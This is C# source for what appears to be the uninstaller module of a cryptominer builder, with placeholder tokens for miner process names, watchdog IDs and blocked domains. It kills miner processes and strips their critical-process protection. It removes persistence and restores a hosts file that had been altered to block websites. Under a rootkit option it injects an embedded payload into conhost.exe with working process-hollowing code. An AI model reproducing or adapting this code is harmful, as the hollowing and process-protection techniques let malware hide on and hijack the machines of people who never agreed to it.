using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Security.Principal;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;
using System.Resources;
using System.Threading;
using System.Diagnostics;
using Microsoft.Win32;
using System.Collections.Generic;
using System.Management;
using System.Linq;

public partial class _rUninstaller_
{
    private static string libsPath = Path.Combine(Environment.GetFolderPath($CSLIBSROOT), "Google\\Libs\\");

    private static void Main()
    {
#if DefRootkit
        try
        {
            using (var archive = new ZipArchive(new MemoryStream(GetTheResource("rootkit_u"))))
                foreach (ZipArchiveEntry entry in archive.Entries)
                    if (entry.FullName.Contains("st"))
                        using (var streamdata = entry.Open())
                        using (var ms = new MemoryStream())
                        {
                            streamdata.CopyTo(ms);
                            Inject(ms.ToArray(), Path.Combine(Directory.GetParent(Environment.SystemDirectory).FullName, "System32\\conhost.exe"), "");
                        }
        }
        catch { }
#endif

#if DefStartup
        try
        {
            Command("cmd", "#REGREM");
        }
        catch {}

        try
        {
            Command("cmd", "#TASKSCHREM");
        }
        catch { }
#endif

        try
        {
            List<int> pids = new List<int> { };
            var _rarg1_ = new ConnectionOptions();
            _rarg1_.Impersonation = ImpersonationLevel.Impersonate;
            var _rarg2_ = new ManagementScope("\\root\\cimv2", _rarg1_);
            _rarg2_.Connect();

            var _rarg3_ = new ManagementObjectSearcher(_rarg2_, new ObjectQuery("Select CommandLine, ProcessID from Win32_Process")).Get();
            string[] minerset = new string[] { $FINDSET };
            foreach (ManagementObject MemObj in _rarg3_)
                if (MemObj != null && MemObj["CommandLine"] != null && (minerset.Any(MemObj["CommandLine"].ToString().Contains) || MemObj["CommandLine"].ToString().Contains(" #WATCHDOGID")))
                    pids.Add(Convert.ToInt32(MemObj["ProcessID"]));

#if DefProcessProtect
            UnProtect(pids.ToArray());
#endif

            foreach (int pid in pids)
                Command("cmd", string.Format("/c taskkill /f /PID \"{0}\"", pid));
        }
        catch { }

        Thread.Sleep(3000);
        try
        {
            Directory.Delete(libsPath, true);
#if DefStartup
            File.Delete(PayloadPath);
#endif
        }
        catch { }

#if DefBlockWebsites
        try
        {
            string hostspath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers/etc/hosts");
            List<string> hostscontent = new List<string>(File.ReadAllLines(hostspath));

            string[] domainset = new string[] { $CSDOMAINSET };
            for (int i = hostscontent.Count - 1; i >= 0; i--)
                foreach (string set in domainset)
                    if (hostscontent[i].Contains(set))
                    {
                        hostscontent.RemoveAt(i);
                        break;
                    }

            File.WriteAllLines(hostspath, hostscontent.ToArray());
        }
        catch { }
#endif
        Environment.Exit(0);
    }

    private static void Command(string _rarg1_, string _rarg2_)
    {
        try
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = _rarg1_,
                Arguments = _rarg2_,
                WorkingDirectory = Environment.SystemDirectory,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            });
        }
        catch { }
    }

#if DefRootkit
    private static byte[] GetTheResource(string resid)
    {
        var MyResource = new System.Resources.ResourceManager("uninstaller", Assembly.GetExecutingAssembly());
        return (byte[])MyResource.GetObject(resid);
    }

    [DllImport("kernel32.dll")]
    private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, byte[] lpStartupInfo, byte[] lpProcessInformation);

    [DllImport("kernel32.dll")]
    private static extern long VirtualAllocEx(long hProcess, long lpAddress, long dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    private static extern long WriteProcessMemory(long hProcess, long lpBaseAddress, byte[] lpBuffer, int nSize, long written);

    [DllImport("ntdll.dll")]
    private static extern uint ZwUnmapViewOfSection(long ProcessHandle, long BaseAddress);

    [DllImport("kernel32.dll")]
    public static extern uint CreateRemoteThread(long hProcess, IntPtr lpThreadAttributes, uint dwStackSize, long lpStartAddress, long lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    private static extern bool SetThreadContext(long hThread, IntPtr lpContext);

    [DllImport("kernel32.dll")]
    private static extern bool GetThreadContext(long hThread, IntPtr lpContext);

    [DllImport("kernel32.dll")]
    private static extern uint ResumeThread(long hThread);

    [DllImport("kernel32.dll")]
    private static extern bool CloseHandle(long handle);


    private static void Inject(byte[] payload, string injectionpath, string arguments)
    {
        try
        {
            int e_lfanew = Marshal.ReadInt32(payload, 0x3c);
            int sizeOfImage = Marshal.ReadInt32(payload, e_lfanew + 0x18 + 0x038);
            int sizeOfHeaders = Marshal.ReadInt32(payload, e_lfanew + 0x18 + 0x03c);
            int entryPoint = Marshal.ReadInt32(payload, e_lfanew + 0x18 + 0x10);

            short numberOfSections = Marshal.ReadInt16(payload, e_lfanew + 0x4 + 0x2);
            short sizeOfOptionalHeader = Marshal.ReadInt16(payload, e_lfanew + 0x4 + 0x10);

            long imageBase = Marshal.ReadInt64(payload, e_lfanew + 0x18 + 0x18);

            byte[] bStartupInfo = new byte[0x68];
            byte[] bProcessInfo = new byte[0x18];

            IntPtr pThreadContext = new IntPtr(16 * ((Marshal.AllocHGlobal(0x4d0 + (16 / 2)).ToInt64() + (16 - 1)) / 16));

            Marshal.WriteInt32(pThreadContext, 0x30, 0x0010001b);

            CreateProcess(null, injectionpath + (!string.IsNullOrEmpty(arguments) ? " " + arguments : ""), IntPtr.Zero, IntPtr.Zero, true, 0x4u, IntPtr.Zero, Path.GetDirectoryName(injectionpath), bStartupInfo, bProcessInfo);
            long processHandle = Marshal.ReadInt64(bProcessInfo, 0x0);
            long threadHandle = Marshal.ReadInt64(bProcessInfo, 0x8);

            ZwUnmapViewOfSection(processHandle, imageBase);
            VirtualAllocEx(processHandle, imageBase, sizeOfImage, 0x3000, 0x40);
            WriteProcessMemory(processHandle, imageBase, payload, sizeOfHeaders, 0L);

            for (short i = 0; i < numberOfSections; i++)
            {
                byte[] section = new byte[0x28];
                Buffer.BlockCopy(payload, e_lfanew + (0x18 + sizeOfOptionalHeader) + (0x28 * i), section, 0, 0x28);

                int virtualAddress = Marshal.ReadInt32(section, 0x00c);
                int sizeOfRawData = Marshal.ReadInt32(section, 0x010);
                int pointerToRawData = Marshal.ReadInt32(section, 0x014);

                byte[] bRawData = new byte[sizeOfRawData];
                Buffer.BlockCopy(payload, pointerToRawData, bRawData, 0, bRawData.Length);

                WriteProcessMemory(processHandle, imageBase + virtualAddress, bRawData, bRawData.Length, 0L);
            }

            GetThreadContext(threadHandle, pThreadContext);

            byte[] bImageBase = BitConverter.GetBytes(imageBase);

            long rdx = Marshal.ReadInt64(pThreadContext, 0x88);
            WriteProcessMemory(processHandle, rdx + 16, bImageBase, 8, 0L);

            Marshal.WriteInt64(pThreadContext, 0x80, imageBase + entryPoint);

            SetThreadContext(threadHandle, pThreadContext);
            ResumeThread(threadHandle);

            Marshal.FreeHGlobal(pThreadContext);
            CloseHandle(processHandle);
            CloseHandle(threadHandle);
            
        }
        catch { }
    }
#endif

#if DefProcessProtect
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    private static void UnProtect(int[] pids)
    {
        try
        {
            Process.EnterDebugMode();

            foreach(int pid in pids)
            {
                int isCritical = 0;
                int BreakOnTermination = 0x1D;
                NtSetInformationProcess(OpenProcess(0x001F0FFF, false, pid), BreakOnTermination, ref isCritical, sizeof(int));
            }
        }
        catch { }
    }
#endif
}